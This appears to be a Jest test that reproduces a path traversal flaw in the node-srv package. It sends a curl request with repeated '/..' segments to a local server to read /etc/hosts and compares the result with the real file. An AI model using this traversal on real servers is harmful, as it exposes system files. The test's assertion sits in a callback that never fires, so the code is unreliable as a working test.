function genstr(n)
{
    let a ='/node_modules/';//start the traversal from node_modules directory!
    for(i=0;i<n+1;i++)
     {
        a = a + '/..';
     }
     a =a+ '/etc/hosts'
     return a;
}

test("Path Traversal in node-srv",() => {
    var Server = require('node-srv');
    const fs = require('fs');
    const sleep = require('sleep');
    const path = './file2';
    const { exec } = require("child_process");

    var srv = new Server({
        port: 8080,
        root: './',
        logs: true
    }, function () {
        //console.log('Server stopped');
    });

    //sleep.sleep(5);
    exec("pwd", (error, stdout, stderr) => {
        
        let count1 = (stdout.match(/\//g) || []).length;//counts number of '/' => diretories to be parsed
        let path1 = '.' + genstr(count1);
        let attack_string = 'curl -v --path-as-is http://127.0.0.1:8080' + genstr(count1);

        let read_data = "";
        read_data = fs.readFileSync(path1, 'utf8' , (err, data) => { })
        fs.writeFileSync('./file1', read_data, err => {})

        exec(attack_string, (error, stdout, stderr) => {
            fs.writeFileSync('./file2', `${stdout}`, err => { 

                let r1 = fs.readFileSync('./file1');
                let r2 = fs.readFileSync('./file2');

                let out = r2.equals(r1);
                expect(out).toBe(true);
            });
        });

    });

});